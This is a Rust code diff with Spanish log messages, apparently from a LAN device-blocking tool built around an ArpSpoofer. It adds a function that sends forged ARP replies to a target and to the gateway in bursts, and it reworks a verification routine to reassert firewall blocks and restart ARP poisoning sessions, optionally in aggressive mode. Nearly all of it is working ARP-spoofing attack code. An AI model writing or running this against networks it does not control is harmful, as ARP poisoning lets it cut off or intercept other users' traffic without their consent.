@@ -355,6 +355,57 @@ fn run_poison_loop(
     Ok(())
 }
 
+fn reinforce_poisoning(
+    context: Arc<NetworkContext>,
+    target_ip: Ipv4Addr,
+    target_mac: PnetMacAddr,
+) -> Result<Vec<String>> {
+    let interfaces = pnet_datalink::interfaces();
+    let interface = interfaces
+        .into_iter()
+        .find(|iface| iface.name == context.interface_name)
+        .ok_or_else(|| {
+            anyhow::anyhow!(
+                "No se encontró la interfaz de red {}",
+                context.interface_name
+            )
+        })?;
+
+    let mut config = DatalinkConfig::default();
+    config.write_buffer_size = 2048;
+
+    let (mut tx, _rx) = match pnet_datalink::channel(&interface, config)? {
+        Ethernet(tx, rx) => (tx, rx),
+        _ => return Err(anyhow::anyhow!("Canal de enlace no soportado")),
+    };
+
+    let mut target_packet = [0u8; 42];
+    build_arp_reply(
+        &mut target_packet,
+        context.local_mac,
+        context.gateway_ip,
+        target_mac,
+        target_ip,
+    );
+
+    let mut gateway_packet = [0u8; 42];
+    build_arp_reply(
+        &mut gateway_packet,
+        context.local_mac,
+        target_ip,
+        context.gateway_mac,
+        context.gateway_ip,
+    );
+
+    for _ in 0..5 {
+        let _ = tx.send_to(&target_packet, None);
+        let _ = tx.send_to(&gateway_packet, None);
+        std::thread::sleep(Duration::from_millis(40));
+    }
+
+    Ok(vec![format!("Refuerzo ARP enviado para {}", target_ip)])
+}
+
 fn build_arp_reply(
     buffer: &mut [u8],
     source_mac: PnetMacAddr,
@@ -657,16 +708,61 @@ impl ArpSpoofer {
             }
         };
 
-        let targets = self.targets.lock().await;
-        if !targets.contains_key(&identity.ip.to_string()) {
-            return Err(anyhow!(
-                "No existe una sesión de bloqueo activa para {}",
-                identity.ip
-            ));
-        }
-        drop(targets);
+        let settings = { self.settings.lock().await.clone() };
+        let mut logs = Vec::new();
 
-        verify_blocking(ipv4).await
+        if settings.block_mode {
+            logs.push(format!("Reforzando firewall para {}", identity.ip));
+            self.ensure_firewall_ready().await?;
+            self.firewall.block(&identity.ip.to_string()).await?;
+            logs.push("Regla de firewall reafirmada".to_string());
+        } else {
+            logs.push("block_mode desactivado: omitiendo refuerzo de firewall".to_string());
+        }
+
+        let session_snapshot = {
+            let guard = self.sessions.lock().await;
+            guard.get(&identity.ip.to_string()).map(|control| {
+                (
+                    control.context.clone(),
+                    control.target_ip,
+                    control.target_mac,
+                )
+            })
+        };
+
+        if let Some((context, session_ip, session_mac)) = session_snapshot {
+            match tokio::task::spawn_blocking(move || {
+                reinforce_poisoning(context, session_ip, session_mac)
+            })
+            .await
+            {
+                Ok(Ok(mut extra_logs)) => logs.append(&mut extra_logs),
+                Ok(Err(err)) => logs.push(format!("No se pudo reforzar la sesión ARP: {}", err)),
+                Err(err) => logs.push(format!("Error interno reforzando ARP: {}", err)),
+            }
+        } else {
+            logs.push("No se encontró sesión ARP activa; se iniciará una nueva".to_string());
+            let context = discover_network_context()?;
+            let target_mac = resolve_target_mac(&context, ipv4)?;
+            let interval = default_interval(settings.packet_interval_secs);
+            let control = start_poison_session(
+                context.clone(),
+                ipv4,
+                target_mac,
+                settings.aggressive_mode,
+                interval,
+            )?;
+            self.sessions
+                .lock()
+                .await
+                .insert(identity.ip.to_string(), control);
+            logs.push("Sesión de ARP poisoning reactivada".to_string());
+        }
+
+        let (success, mut verification_logs) = verify_blocking(ipv4).await?;
+        logs.append(&mut verification_logs);
+        Ok((success, logs))
     }
 
     /// Detiene el bloqueo actual del dispositivo indicado.
